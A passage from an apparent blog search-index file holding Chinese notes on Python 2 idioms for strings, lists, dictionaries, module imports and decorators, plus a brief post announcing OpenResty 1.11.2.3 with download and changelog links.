字符串首字母变大写123info = 'ssfef'print info.capitalize()print info.title() 返回一个字符串居中，并使用空格填充至长度width的新字符串。 1"center string".center(width) #width设置为控制台宽度，可控制输出的字符串居中。 列举所有字母 123print string.ascii_uppercase 所有大写字母print string. ascii_lowercase 所有小写字母print string.ascii_letters 所有字母（包括大小写） 列表(list)列表去重12ids = [1,4,3,3,4,2,3,4,5,6,1]ids = list(set(ids)) 列表运算12345a=[1,2,3]b=[3,4,5]set(a)&amp;set(b) 与set(a)|set(b) 或set(a)-set(b) 非 单列表元素相加123a = ["Code", "mentor", "Python", "Developer"]&gt;&gt;&gt; print " ".join(a)Code mentor Python Developer 多列表元素分别相加12345678list1 = ['a', 'b', 'c', 'd']list2 = ['p', 'q', 'r', 's']&gt;&gt;&gt; for x, y in zip(list1,list2): print x, yapbqcrds 将嵌套列表转换成单一列表1234a = [[1, 2], [3, 4], [5, 6]]&gt;&gt;&gt; import itertools&gt;&gt;&gt; list(itertools.chain.from_iterable(a))[1, 2, 3, 4, 5, 6] 列表内元素相加 12a=[1,2,3]（数字）sum(a) 产生a-z的字符串列表1map(chr,range(97,123)) 列表复制1234a=[1,2,3]b=a当对b进行操作时，会影响a的内容，因为共用一个内存指针，b=a[:] 这样就是单独复制一份了。 ##列表解析## if+else配合列表解析1[i if i &gt;5 else -i for i in range(10)] 字典操作(dict)筛选出值重复的key123456list1=self.dict_ip.items() ddict=defaultdict(list) for k,v in list1: ddict[v].append(k) list2=[(i,ddict[i]) for i in ddict if len(ddict[i])&gt;1] dict_ns=dict(list2) 字典排序（py2）123file_dict=&#123;"a":1,"b":2,"c":3&#125;file_dict_new=sorted(file_dict.iteritems(), key=operator.itemgetter(1),reverse=True) #字典排序,reverse=True由高到低，itemgetter(1)表示按值排序，为0表示按key排序。 模块操作导入模块时，设置只允许导入的属性或者方法。1234567891011fb.py:-----------------------__all__=["a","b"]a="123"c="2345"def b(): print “123”-----------------------from fb import *可以导入__all__内定义的变量，a跟b()可以导入，c不行。如果不定义__all__则所有的都可以导入。 导入上级目录下的包12sys.path.append("..")from spider.spider_ import spider_ 导入外部目录下的模块1需要在目标目录下创建__init__.py文件，内容随便。 增加模块属性 1234有时候源代码中，我们需要写上自己的名字以及版本介绍信息，可以用__name__的方式定义。a.py:#! -*- coding:utf-8 -*-__author__="nMask" 然后当我们导入a这个模块的时候，可以输出dir(a)看看12345&gt;&gt;&gt; import p&gt;&gt;&gt; print dir(p)['__author__', '__builtins__', '__doc__', '__file__', '__name__', '__package__']&gt;&gt;&gt; print p.__author__nmask 动态加载一个目录下的所有模块 1234567891011目录：---test ----a.py ----b.py---c.pyc.py导入test下面的所有模块：for path in ["test"]: for i in list(set([os.path.splitext(i)[0] for i in os.listdir("./"+path)])): if i!="__init__" and i!=".DS_Store": ##排除不必要的文件 import_string = "import path+"."+i+" exec import_string #执行字符串中的内容 函数操作装饰器函数输出当前时间装饰器12345def current_time(aclass): def wrapper(): print "[Info]NowTimeis:",time.ctime() return aclass() return wrapper itertools迭代器123p=product(["a","b","c","d"],repeat=2)----[("a","a"),("b","b")......] reduce函数函数本次执行的结果传递给下一次。1234def test(a,b): return a+breduce(test,range(10))结果：从0+1+2......+9 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenResty新的正式版1.11.2.3]]></title>
    <url>%2F2017%2F04%2F22%2F04_OpenResty%E6%96%B0%E7%9A%84%E6%AD%A3%E5%BC%8F%E7%89%881.11.2.3%2F</url>
    <content type="text"><![CDATA[OpenResty 新的正式版 1.11.2.3QQ群:397745473 刚刚发布了 OpenResty 新的正式版 1.11.2.3。感谢所有的开发者和贡献者！下载位置在这里：https://openresty.org/en/download.html完整的更动列表在这里：https://openresty.org/en/changelog-1011002.html发布公告在这里：https://groups.google.com/d/msg/openresty/4UJ5gtzsuDU/MYSpMDAIAAAJ建议所有的 OpenResty 生产用户都升级到此版本。下一次 OR 发布准备升级 NGINX 核心到最新版了。 QQ群：397745473]]></content>
      <categories>
        <category>openresty</category>
      </categories>
      <tags>
        <tag>openresty</tag>
      </tags>
  </entry>
</search>
